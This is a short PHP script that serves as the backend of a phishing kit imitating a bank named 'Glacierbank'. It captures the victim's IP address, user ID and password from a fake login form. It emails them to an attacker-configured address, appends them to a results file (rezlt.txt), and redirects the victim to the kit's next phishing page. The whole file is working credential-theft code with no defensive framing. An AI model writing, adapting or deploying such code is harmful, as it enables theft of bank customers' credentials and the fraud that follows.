<?php


$ip = $_SERVER['REMOTE_ADDR'];

include('./XEmail.php');

$subject = "Glacierbank LOGIN";
$headers = "From: SuleimanSamar <Glacierbank>\r\n";
$message .= "
+----/!\----<.![+] Glacierbank LOGIN  [+]!.>---/!\----+
 [IP]                 : ".$ip."
 [User Id & VMN]      : ".$_POST['1']."
 [PASSWORD]           : ".$_POST['2']."
-------------------------------------------------\n";
mail($email,$subject,$message,$headers);
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);


header("Location: ../Main/Email.html");

?>